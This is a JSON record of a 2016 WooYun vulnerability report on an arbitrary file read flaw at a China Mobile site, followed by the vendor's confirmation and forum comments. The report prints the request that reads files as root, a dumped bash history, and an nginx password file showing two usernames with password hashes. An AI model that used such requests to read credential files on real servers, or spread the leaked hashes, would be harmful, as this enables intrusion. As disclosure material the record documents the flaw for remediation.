{"id": 87590, "wybug_id": "wooyun-2016-0198788", "wybug_title": "中国移动某站任意文件读取                                      ", "wybug_corp": "中国移动", "wybug_author": "小川", "wybug_date": "2016-04-21 13:30", "wybug_open_date": "2016-06-09 16:20", "wybug_type": "敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-09：\t细节向公众公开  简要描述： 中国移动某站任意文件读取 详细说明：  root权限，可以读取历史命令http://**.**.**.**/live800/downlog.jsp?path=/&fileName=/root/.bash_historycdcdlscd /find ./ -name 'nginx*'cd ./usr/local/nginxlscd sbinls./nginx -vps -ef|grep nginxcd ..lscd conflscat nginx.confvi nginx.conflscd ..lscd sbinls./nginxifconfig  -alscd ..lscd conflsvi nginx.conflsps -ef|grep nginxcd ..lscd bincd sbinls./nginx -s reloadps -ef|grep nginxps -ef|grep nginx./nginx -s stopps -ef|grep nginx./nginxps -ef|grep nginxifconfig -alsexport TMOUT=0lscd /find ./ -name 'nginx'cd usrcd localcd nginxlscd confls -ltr |wc -llsls -ltrcat nginx.conf.defaultlspwdifconfig -acd ..lscd htmllscd ..lspwdcd htmllscd ..lsfind ./ -name 'emapdomains*'cd client_body_templscd ..lscd fastcgi_templscd ..lscd proxy_templscat 1cd 1lsfile 00cd 00lscd ..lscd ..lscd ..lscd scgi_templscd ..lscd uwsgi_templscd ..lscd onlscd conflsls -ltrcat mime.typesls -ltr|wc -lls -ltrcdcd etccd /etclscat hostscat resolv.confcd /usr/localcd nginxlscd conflscat nginx.confcat upstream.confcat nginx.conflsmore proxy.confls -ltrcat proxy.confls -ltrcat upstream.confcdlscd /find ./ -name '*emapdomains*'lscd /usr/locallscd nginxlscd conflsgrep emapdomains *lscd ..lscd logslspwdcd ..lscd conflslspwdifconfig -alscd ..lstar cvf ../nginx_conf_byld_20160113.tar conflscd ..lslsexport TMOUT=0lsps -ef|grep nginxcd /find ./ -name find ./ -name 'nginx*'pwdfind ./ -name '**.**.**.**'cd /usr/localcd nginxlscd conflscat nginx-confifconfig -als -ltrcd keylscd ..lscat ngx_passwdpwdcd /usrlscd locallscd bushucd nginxlscdcd /lsfind ./ -name 'configure'more ./home/Nginx/pcre-8.35/configure!lslslscdlscd ..lscd /usrlscd locallscd sbinlscd ..lscd nginxlscd conflscd ..lscd logslsls -ltrcd datalscat *cdlslscd /usrcd locallscd nginxlscd conflscat upstaream.confmore upstream.conflsmore nginx.conflsmore upstream.confcd ..lscd sbinls./nginxps -ef|grep nginxexport TMOUT=0cd /usr/local/nginxcd /etc/init.dlscd ..vi hostscd /usr/local/nginxlscd conf/lscat upstream.conf cd /etc/init.xcd /etc/init.dvi nginx ps -ef | grep ngixnps -ef | grep nginxcd /usr/locallscd nginxlscd conflsls -ltrmore nginx.conf vi nginx.confifconfigexitcd /usr/locallscd nginxlspwdcd htmllsls -ltrcd ../conflsvi nginx.confifconfigcd /usr/locallscd nginxlsls -ltrcd conflsvi nginx.conflscd /usrcd locallscd nginxlsps -ef|grep nginxcd logsls -ltrtail -f access-bassapp.logls -ltrgrep mbomc access-bassapp.loggrep mbomc access.logcd ..lscd conflsvi nginx.conf;slscd /usrcd locallscd nginxlscd logsls -ltrtail -f access.logls -ltrtail -10000f access-mbomc.logcd /usrcd local cd nginxlscd sbinls./nginx -s reloadps -ef|grep nginxcd /find ./ -name 'Squid'find ./ -name Squidfind ./ -name squidps -ef|grep squidexport TMOUT=0lscd /usrlscd locallscd nginxlscd conflsvi nginx.confvi nginx.conflscd ..lslsexport TMOUT=0lscd conflsls -ltrexitlsls -ltrlscd /usrlscd locallscd nginxlscd conflsvi nginx.conflscd ../sbinls./nginx -s stopvi /usr/local/nginx/conf/nginx.confps -ef|grep nginxexitlsexport TMOUT=0lscd /usrlscd locallscd nginxcd conflsvi upstream.confpwdifconfig -apwdcd ../sbinls./nginx -s stopps -ef|grep nginxlscd ..lscd conflsvi upstream.confcd ../sbinls./nginx -s stopcd ../conflsvi upstream.confcd ../sbinls./nginx -s stopps -ef|grep nginxpwd/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.confps -ef|grep nginxexitlscd /usr/localcd nginxcd confvi nginx.confcd ../sbin./nginx -s reloadps -ef|grep nginxcd /usr/local/nginxcd conf/vi nginx.confvi nginx.confcd ../sbin/ls./nginx -s reloadvi ../conf/nginx.conf./nginx -s reloadcd ../conf/lsvi upstream.conf vi ../conf/nginx.confcd ../sbin/./nginx -s reloadexitipconfig -aipfongiipconfigifconfiguname -atopifconfig lsuname -apsssh root@**.**.**.**ls -ltrls -ltr /usr/local/nginx/sbin/nginx*/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.confps -ef|grep nginx.confps -ef|grep nginxcdlscd ..lscd /homelscd live800lscat startLive800Server.sh./startLive800Server.sh ps -ef|grep tomcatifconfigifconfig |morenetstat -rnping **.**.**.**ssh **.**.**.**wholscd /find ./ -name squidcd ./etc/squidlspwdcd ./usr/sbin/cd /cd ./usr/sbin/ls./usr/sbin/squid -scd //usr/sbin/squid -sps -ef|grep squidps -ef|grep squidps -ef|grep squidps -ef|grep squidps -ef|grep squidps -ef|grep squidps -ef|grep squidps -ef|grep squidps -ef|grep squidps -ef|grep squidps -ef|grep squidexitcd /find ./ -name 'squid'/usr/sbin/squid -sps -ef|grep squidlsps -ef|grep nginxcd /usr/local/nginx/conf/lsmore nginx.conflsmore nginx.conf  exitcd /usr/local/nginxlscd conf/vi nginx.confcd ../sbin./nginx -s reloadcd ..logscd ../logslstail -f access.log cd ..cd conf/lsvi upstream.conf cd ../sbin/./nginx -s reloadexitlslscdlsps -ef|grep nginxcd /usr/local/nginx/conf/lsmore nginx.conflscdlslsps -ef|grep nginx/usr/local/nginx/sbin/nginx -s reloadps -ef|grep nginxexitlsps -ef|grep nginxcd /usr/local/nginx/conf/lscd ..lscd logslsls -ltrtail -f access.logping **.**.**.**tail -f access-mbomc.logping **.**.**.**ping **.**.**.**lsexport TMOUT=0lscdlsps -ef|grep nginxcd /usr/local/nginx/conf/lsls -ltrcd ..lscd logslsls -ltrtail -1000f access-mbomc.logLSlsls -ltrtail -f access-mbomc.loglsls -ltrtail -f access-mbomc.logls -ltripconfig -aifconfig -assh root@**.**.**.**ssh root@**.**.**.**cdlscd /usr/local/nginxlscd conflsmore nginx.conflsifconfig -auname -alspwdcd /homelscd live800lscd workinglscd tomcatlslscd /find ./ -name 'live800'cd ./home/live800lscd ./home/live800/working/tomcat/live800lscd workinglscd tomcatlscd ..lscd ..lsmore startLive800Server.sh cd ../tomcat/lscd workinglscd tomcatlsls -ltrcd webappslscd live800lspwdcd /home/live800/working/tomcat/webapps/live800cd live800]ifconfig -aunamecd /homelscd /live800cd live800lsstartLive800Server.shsh startLive800Server.shps -ef|grep live800ps -ef|grep nginxcd /usr/locallslscd /usr/locallscd gninxcd nginxlscd sbinlspwdexport TMOUT=0cd ..lscd conflspwdcd/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.confps -ef|grep nginxlscd /homecd live800lsls -ltrcd workinglsftp **.**.**.**cd /homecd live800lscd /workcd /workinglscd workinglscd tomcatlscd live800lscd chatClientlscd chinamobilelscd scriptsls -Fcd chatbox.jslsls -Fls -lcd lscd /homelscd live800lscd workinglscd tomcatlscd tomcatlscd ..lscd tomcatlscd webappslsls -ltrcd live800lsls -ltr zxkf_index.jspls -ltr *index.jsp*more index.jspmore showAccount.jspmore showAccount.jspls -ltr chatbox.jspls cd chatClientlsmore chatbox.htmlsps -ef|grep nginxcd /usr/local/nginx/conf/more nginx.conflsls -ltrps -ef|grep nginxcd /usr/local/nginx/conf/lsvi nginx.confcd ..lscd sbinls./nginx -s reloadps -ef|grep nginxexitps -ef | grep ngixps -ef | grep ngps -ef|grep nginxcat /usr/local/nginx/conf/nginx.confenvlsfind . -name | grep 'index2'find . -name *.* | grep 'index2'find . -name 'index2'find . -name 'index2'pwdcd ..lsfind . -name 'index2'find . -name 'index2.jsp'cat ./sys/devices/system/cpu/cpu15/cache/index2cd ./sys/devices/system/cpu/cpu15/cache/index2lscd ..lscdcd ..lsfind . -name 'index2.jsp'cd /homecd /live800lscd live800lscd workingls -lcd tomcatls -lcd webappslscd live800ls -llslslscd /homelscd live800lscd workinglsps -ef|grep nginxcd /usr/local/nginx/sbin/./nginx -s reloadexport TMOUT=0./nginx -s reloadlscd ..lscd conflsvi nginx.confcd ..lscd sbin./nginx -s reloadcd ..cd conflsvi nginx.conflscd /devlscd shmlscdlscdlsps -ef|grep nginxcd /usr/local/nginx/conf/lsvi nginx.confvi proxy.conflscd cachecd /cachelscd proxy_temp_pathlsls -ltrpwdls -ltrrm *lscd ..lscd proxy_cache_pathlsdu -sm *cd 0lscd 00lsifconfig exitlslsps -ef|grep nginxcd /usr/local/nginx/sbin/ls./nginx -s reloadlsps -ef|grep nginxpwdcd ..lscd client_body_templscd ..lscd fastcgi_templscd ..lscd htmllscd imageslscd ..lscd ..lscd oncd proxy_templsfile 1cd 1lsfile *cd 00lscd ..lscd ..lscd ..lscd scgi_templscd ..lscd uwsgi_templscd export TMOUT=0ssh **.**.**.**lsps -ef | grep nginxcat /usr/local/nginx/conf/nginx.conflspwdls -Acd /homelscd /live800find ./ 'live800' e fflssd ..cd ..pwdcd /SDSSO/WebSSO/zxkf/zxkf_index.jspfind ./'zxkf_index.jsp'exitlscd /home/live800/working/tomcat/webapps/live800lscd /home/live800/working/tomcat/webapps/live800lsfind .-name zxkf_index.jspcd ..lscd ..cd ..lspwdcd ..cd ..lspwdcd .lscd ..find .-name zxkf_index.jspcd /home/live800/working/tomcatls cd /restartTomcat.shexitlspwd/home/live800/working/cd /homelscd /live800/home/live800/working/tomcat/webapps/live800cd /home/live800/working/tomcat/webapps/live800ps -ef|grep live800lscd /home/live800lscd /workingcd /home/live800/working/tomcat/webapps/live800ps -ef|grep \"live800\"lspwdps -ef|grep live800lspwdls -ffind -name/ live800find lspwdcd /homelscd /weblogicpwdps -ef| grep live800ls -Als -alscd /home/live800/working/tomcat/restartTomcat.shcd /home/live800/working/tomcat/lsls -apwdfind /-name live800lscd /live800find /-name \"zxkf_index.jsp\"pwdcd..cd ..cd pwdhistory 20history 50exitlshistory 50lspwdls -Acd /SDSSO/WebSSO/zxkf/zxkf_index.jsp  cd /SDSSOlsls ls -a看到个http://**.**.**.**/live800/downlog.jsp?path=/&fileName=/usr/local/nginx/conf/ngx_passwdzhangyong:2RsUTTsvOmOdAzengqh:DunTiVFkBxz7A应该该是nginx的登录密码   漏洞证明：     修复方案：  升级   版权声明：转载请注明来源 小川@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2016-04-25 16:18 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向中国移动集团公司通报,由其后续协调网站管理部门处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-21 14:20 |    \t\tDotaer \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:8        | 多学习，多挖洞！)\t\t \n  前排求关注！    \n     2016-04-21 15:47 |    \t\t变色龙 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 好好学习，天天向上。)\t\t \n  泄露啥重要资料？    \n     2016-05-22 09:35 |    \t\tsutdy \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:37        | 0.0)\t\t \n  提醒：级别足够但是无法查看 Rank 高于自己的白帽子漏洞 ( 可以等待进一步公开或者支付 4 个乌云币提前查看     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}